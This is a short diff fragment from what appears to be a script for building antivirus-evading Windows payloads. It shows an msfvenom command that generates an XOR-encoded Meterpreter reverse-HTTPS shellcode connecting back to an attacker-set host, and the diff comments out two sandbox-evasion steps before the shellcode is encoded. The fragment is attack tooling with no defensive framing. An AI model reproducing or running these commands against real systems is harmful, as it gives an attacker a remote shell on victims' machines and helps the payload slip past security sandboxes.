@@ -41,8 +41,8 @@ enable_debug_print
 msfvenom -p windows/x64/meterpreter_reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f raw -a x64 --platform Windows > input/sc_raw.txt
 
 # add evasion techniques
-add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
-add_evasion gethostbyname_sandbox_evasion 'this.that'
+# add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
+# add_evasion gethostbyname_sandbox_evasion 'this.that'
 reset_evasion_technique_counter
 
 # encode msfvenom shellcode
